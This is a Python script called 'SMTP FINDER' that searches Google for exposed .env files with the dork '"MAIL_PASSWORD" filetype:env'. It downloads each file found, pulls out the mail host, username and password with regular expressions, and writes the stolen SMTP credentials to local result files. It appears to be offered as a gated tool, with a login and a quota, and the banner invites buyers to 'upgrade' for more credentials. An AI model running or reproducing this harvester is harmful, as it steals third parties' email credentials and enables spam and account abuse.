#! python3
import requests , os , bs4 , re , random , shelve , getpass , webbrowser , sys

if sys.platform in ["linux","linux2"]:
	W = '\033[0m'
	G = '\033[32;1m'
	R = '\033[31;1m'
	xm = 'lxml'
else:
	W = ''
	G = ''
	R = ''
	xm = ''


retries = shelve.open('logging')
if  retries['max_num'] - retries['num'] == 4:
	try:
		import update
	except:
		print(G + '[*] please check your connection to the internet')
		print('[*] GoodBye ... ')
		exit()
retries.close()

print(R + '''+++++++++++++++++++++++++++++++++++++++++++++++++
+                SMTP FINDER                    +
+              CODER : BEN_TH                   +
+          WHATSAPP : +201006698345             +
+ please Dont use this script in spam (illegal) +
+    FB : www.facebook.com/bassem.beso.18659    +
+++++++++++++++++++++++++++++++++++++++++++++++++''')
print('starting ... Please log in to continue ...')

if sys.platform not in ["linux","linux2"]:
	log = shelve.open('logging')
	log['users'] = {'ghostsarmy':'ghostsarmy'}
	log['num'] = 1
	log['max_num'] = 5
	log.close()

urls = []
log = shelve.open('logging')
def logs():
	global user1

	print(W + 'user : ' , end='')
	user1 = input()
	chk()
	

def chk():
	if user1 in log['users']:
		# print('pass : ' , end = '')
		pass1 = getpass.getpass('Password:')
		if pass1 == log['users'][user1]:
			print(G + '[*] You are logged in as %s and you  have %s retries'% (user1,log['max_num'] - log['num']))

		elif pass1 != log['users'][user1]:
			print('the password is wrong !')
			exit()
	elif user1 not in log['users']:
		print(R + 'there is no user named %s try again ... or contact me to get a user for you' % (user1))
		logs()

logs()


for i in range(5):

	if log['num'] == log['max_num']:
		print(R + 'this user have reached the maximum numbers of retries please contact me to renew the user')
		exit()


	n = str(random.randint(0 , 195))
	res = requests.get('https://www.google.com/search?q=%22MAIL_PASSWORD%22+filetype:env&start=' + n + '&sa=N')

	try:
		res.raise_for_status()
	except Exception as ex:
		print(W + '[*] error : ' , ex)
		print(W + '+'.center(30, '+'))

# x = open('res.txt' , 'wb')
# for shunk in res.iter_content(100000):
# 	x.write(shunk)
# x.close()
	parse = bs4.BeautifulSoup(res.text , xm)

	elems = parse.select('#resultStats')

# print(len(elems))

	pattern = re.compile(r'\d(.)?\d+')

	txt = elems[0].getText()

	search = pattern.search(txt)

	if search:
		print(W + '[*] the number of results : ', end= '')
		print(search.group())

	parse2 = bs4.BeautifulSoup(res.text , 'lxml')

	elems2 = parse2.select('.r a')



# print(elems2[3].getText())

	lenth = len(elems2)

	for i in range(0, lenth):
		start = elems2[i].get('href').find('=') + 1
		end = elems2[i].get('href').find('&s')
		urls.append(elems2[i].get('href')[start:end])


print('[*] you will get only ' , len(urls) , 'SMTP if you want upgrade your user contact me')
print('[*] saving urls ...')
print(W + '+'.center(30, '+'))
# print('+'.center(30, '+'))
urlsfile = open('urls.txt', 'w')
urlsfile.write('\n'.join(urls))
urlsfile.close()
for i in urls:
	if 'http' in i or 'https' in i:
		pattern0 = re.compile(r'http(s)?://(\S+)')
		search0 = pattern0.search(i)

		i = search0.group(2)

		try:
			res2 = requests.get('http://' + i)
		except:
			print(G + '[*] continue ...')
			print(W + '+'.center(30, '+'))
		try:
			res2.raise_for_status()
		except Exception as ex1:
			print(W + '[*] Skiping ... ' , ex1)
			print(W + '+'.center(30, '+'))
	else:
		try:
			res2 = requests.get('http://' + i)
		except:
			print(G + '[*] continue ...')
			print(W + '+'.center(30, '+'))
		try:
			res2.raise_for_status()
		except Exception as ex2:
			print(W + '[*] ERROR : ' , ex2)
			print(W + '+'.center(30, '+'))


	smtp_pattern = re.compile(r'MAIL_HOST=(\S+\.\S+\.\w{2,4})')
	user_pattern = re.compile(r'[a-zA-Z0-9._-]+@\S+\.\w{2,4}')
	pass_pattern = re.compile(r"MAIL_PASSWORD=(')?(\S{5,})(')?")
# print(res2.text)
# smtp = smtp_pattern.search(res2.text)
# print(smtp.group())
	if res2.status_code == 200:
		smtp = smtp_pattern.search(res2.text)
		user = user_pattern.search(res2.text)
		pas = pass_pattern.search(res2.text)

		if smtp and user and pas:
			x0 = '+'.center(30, '+')
			x1 = smtp.group(1)
			x2 = user.group()
			x3 = pas.group(2)
			x4 = '+'.center(30, '+')
			# print('+'.center(30, '+'))
			print(G + 'SMTP : ',x1)
			print(R + 'USER : ',x2)
			if len(x3) < 30:
				print(R + 'PASSWORD : ',x3)
			elif len(x3) > 30:
				print(R + 'PASSWORD : null')
			print(W + '+'.center(30, '+'))
			

			result = open('result%s.txt' % (n) , 'a')
			result.write(x0 + '\n' + 'SMTP : ' + x1 + '\n' + 'USER : ' + x2 + '\n' + 'PASS : ' + x3 + '\n' )
			result.close()

log['num'] += 1
log.close()		
print(W + '[*] Done ...')
print(G + '[*] the results have been saved in ', 'result%s.txt' % (n))
print(W + '[*] Please follow me in FaceBook')
print('[*] FB : https://www.facebook.com/bassem.beso.18659')
# webbrowser.open('https://www.facebook.com/bassem.beso.18659')
# pattern2 = re.compile(r'<a href="(http(s)?://\S+?/.env)" ping=')

# listaurl = pattern2.findall(res.text)

# print(listaurl)

